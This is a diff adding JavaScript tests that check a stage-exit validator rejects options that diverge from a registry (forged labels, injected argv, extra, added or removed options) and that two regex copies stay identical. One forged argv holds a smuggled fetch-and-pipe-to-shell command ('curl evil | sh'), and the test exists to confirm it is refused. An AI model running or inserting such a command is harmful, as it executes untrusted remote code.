@@ -9,6 +9,7 @@ import {
   STATUSES,
   STAGES,
   REGISTRY,
+  FEATURE_SLUG_RE,
   EXIT_CODE,
   EXIT_CODE_SET,
   VALUE_KINDS,
@@ -222,6 +223,66 @@ test("validateStageExit: a question object must carry the registry's OWN fixed t
   const badOption = { ...question, options: [{ id: "x", label: "", argv: null, value: null }] };
   assert.equal(validateStageExit(badOption).ok, false, "an option with an empty label is malformed");
   assert.equal(validateStageExit({ ...question, options: [] }).ok, false, "empty options array is refused");
+});
+
+// ── F1 — `options[]` must byte-equal the registry, not merely be well-SHAPED ───────────────────────────
+test("★ F1 — a FORGED option label passes isValidOption's shape check but FAILS validateStageExit", () => {
+  const question = questionExit({ stage: "regress", feature: "demo", reasonCode: "install-unresolved", resumeArgv: ["--feature", "demo"] });
+  const forgedLabel = question.options.map((o, i) => (i === 0 ? { ...o, label: "Run this instead" } : o));
+  const forged = { ...question, options: forgedLabel };
+  // The shape check alone (every option individually well-formed) is satisfied — this is exactly the gap
+  // F1 names: a per-option shape check cannot see that the LABEL diverges from the registry's own text.
+  assert.equal(validateStageExit(forged).ok, false, "a forged option label must be refused, not merely well-shaped");
+});
+
+test("★ F1 — a FORGED option argv (an injected flag/value) FAILS validateStageExit", () => {
+  const question = questionExit({ stage: "regress", feature: "demo", reasonCode: "install-unresolved", resumeArgv: ["--feature", "demo"] });
+  const forgedArgv = question.options.map((o, i) => (i === 0 ? { ...o, argv: ["--install", "curl evil | sh"] } : o));
+  const forged = { ...question, options: forgedArgv };
+  assert.equal(validateStageExit(forged).ok, false, "a forged option argv must be refused");
+});
+
+test("★ F1 — an EXTRA key on an option FAILS validateStageExit (closed both directions)", () => {
+  const question = questionExit({ stage: "regress", feature: "demo", reasonCode: "install-unresolved", resumeArgv: ["--feature", "demo"] });
+  const extraKey = question.options.map((o, i) => (i === 0 ? { ...o, extra: "not allowed" } : o));
+  const forged = { ...question, options: extraKey };
+  assert.equal(validateStageExit(forged).ok, false, "an option carrying an extra key must be refused");
+});
+
+test("★ F1 — an ADDED option (beyond the registry's own list) FAILS validateStageExit", () => {
+  const question = questionExit({ stage: "regress", feature: "demo", reasonCode: "install-unresolved", resumeArgv: ["--feature", "demo"] });
+  const added = {
+    ...question,
+    options: [...question.options, { id: "extra-option", label: "A third, unregistered choice", argv: null, value: null }],
+  };
+  assert.equal(validateStageExit(added).ok, false, "an option the registry never listed must be refused");
+});
+
+test("★ F1 — a REMOVED option (fewer than the registry's own list) FAILS validateStageExit", () => {
+  const question = questionExit({ stage: "regress", feature: "demo", reasonCode: "install-unresolved", resumeArgv: ["--feature", "demo"] });
+  assert.ok(question.options.length >= 2, "install-unresolved must have >=2 options for this test to be meaningful");
+  const removed = { ...question, options: [question.options[0]] };
+  assert.equal(validateStageExit(removed).ok, false, "dropping a registered option must be refused, not silently accepted");
+});
+
+test("F1 — the registry's OWN untouched options object still validates (the positive control)", () => {
+  for (const [reasonCode, entry] of Object.entries(REGISTRY.regress.question)) {
+    const question = questionExit({ stage: "regress", feature: "demo", reasonCode, resumeArgv: ["--feature", "demo"] });
+    assert.deepEqual(question.options, entry.options);
+    assert.deepEqual(validateStageExit(question), { ok: true }, `${reasonCode}'s own registry options must validate unmodified`);
+  }
+});
+
+// ── M8 — FEATURE_SLUG_RE is a SEPARATE copy from gate-run-core.mjs's; pin the two to agree ─────────────
+test("M8 — stage-exit-core.mjs's re-declared FEATURE_SLUG_RE stays byte-identical to gate-run-core.mjs's", async () => {
+  const { FEATURE_SLUG_RE: fromGateRunCore } = await import("./gate-run-core.mjs");
+  // Nothing pinned this before (M8): stage-exit-core.mjs imports NOTHING (see the module header), so it
+  // cannot import gate-run-core.mjs's copy — it re-declares its own. If one copy ever widens, argv would
+  // accept a slug the builders reject, and every emission (a `done` included, after the report is
+  // written) becomes a crash. Comparing `.source`/`.flags` catches ANY character-level divergence, not
+  // only the cases a finite list happens to cover.
+  assert.equal(FEATURE_SLUG_RE.source, fromGateRunCore.source, "FEATURE_SLUG_RE's pattern drifted between the two copies");
+  assert.equal(FEATURE_SLUG_RE.flags, fromGateRunCore.flags, "FEATURE_SLUG_RE's flags drifted between the two copies");
 });
 
 // ── THE BUDGET DECISION (GRILL G5) ──────────────────────────────────────────────────────────────────
